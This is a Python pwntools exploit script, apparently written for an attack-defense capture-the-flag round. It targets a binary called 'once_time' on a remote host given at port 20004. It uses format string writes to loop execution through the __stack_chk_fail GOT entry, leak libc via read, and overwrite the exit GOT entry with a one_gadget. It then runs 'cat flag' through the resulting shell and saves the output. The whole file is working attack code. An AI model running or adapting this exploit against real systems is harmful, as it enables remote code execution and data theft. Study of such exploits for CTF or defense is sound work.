from sys import argv
from pwn import *

context(os="linux", arch="amd64")
# context.log_level = "debug"
# r = process("./once_time", aslr=0)
r = remote(argv[1], 20004)
e = ELF("./once_time")
libc = e.libc

def sl(s):
	r.sendline(s)

def sd(s):
	r.send(s)

def rc(timeout=0):
	if timeout == 0:
		return r.recv()
	else:
		return r.recv(timeout=timeout)

def ru(s, timeout=0):
	if timeout == 0:
		return r.recvuntil(s)
	else:
		return r.recvuntil(s, timeout=timeout)

start = 0x400983

rc()
sl(p64(e.got["__stack_chk_fail"]))
rc()
payload = '%'+str(start)+"d%12$n"
payload = payload.ljust(0x20, "\x00")
sd(payload)
ru("input your name: ")
sl(p64(e.got["read"]))
ru("leave a msg: ")
# gdb.attach(r, "b *0x400968")
# # raw_input()
payload = "%12$s"
payload = payload.ljust(0x20, "\x00")
sd(payload)
libc.address = int(rc()[:6][::-1].encode("hex"), 16) - libc.symbols["read"]
log.info("libc > " + hex(libc.address))

# gdb.attach(r, "b *0x400968")
# # raw_input()
one_gadget = 0xf1147 + libc.address
log.info("one_gadget > " + hex(one_gadget))
sl(p64(e.got["exit"]))
ru("leave a msg: ")
# gdb.attach(r, "b *0x400968")
# # raw_input()
payload = "%" + str(one_gadget & 0xFFFF) + "d%12$hn"
payload = payload.ljust(0x20, "\x00")
sd(payload)
# raw_input()
ru("input your name: ")
# raw_input()

# gdb.attach(r, "b *0x400968")
# # raw_input()
sl(p64(e.got["exit"]+2))
ru("leave a msg: ")
# gdb.attach(r, "b *0x400968")
# # raw_input()
payload = "%" + str((one_gadget >> 16) & 0xFFFF) + "d%12$hn"
payload = payload.ljust(0x20, "\x00")
sd(payload)
# raw_input()
ru("input your name: ")
# raw_input()

# gdb.attach(r, "b *0x400968")
# # raw_input()
sl(p64(e.got["exit"]+4))
ru("leave a msg: ")
# gdb.attach(r, "b *0x400968")
# # raw_input()
payload = "%" + str((one_gadget >> 32) & 0xFFFF) + "d%12$hn"
payload = payload.ljust(0x20, "\x00")
sd(payload)
# raw_input()
ru("input your name: ")
# raw_input()

# gdb.attach(r, "b *0x400968")
# # raw_input()
sl(p64(e.got["exit"]+6))
ru("leave a msg: ")
log.info("one_gadget > " + hex(one_gadget))
# gdb.attach(r, """b *0x40094D
# b *0x400968""")
# raw_input()
log.info("one_gadget > " + hex((one_gadget >> 48) & 0xFFFF))
if (one_gadget >> 48) & 0xFFFF != 0:
	payload = "%" + str((one_gadget >> 48) & 0xFFFF) + "d%12$hn"
else:
	payload = "%12$hn"
payload = payload.ljust(0x20, "\x00")
sd(payload)
# raw_input()

ru("input your name: ")
sl('a')
ru("leave a msg: ")
sl("%p")
ru('\n')

f = open("./flags", "a")
sl('cat flag')
flag = rc(timeout=1).rstrip("\n")
log.info("flag > " + flag)
f.write(flag+'\n')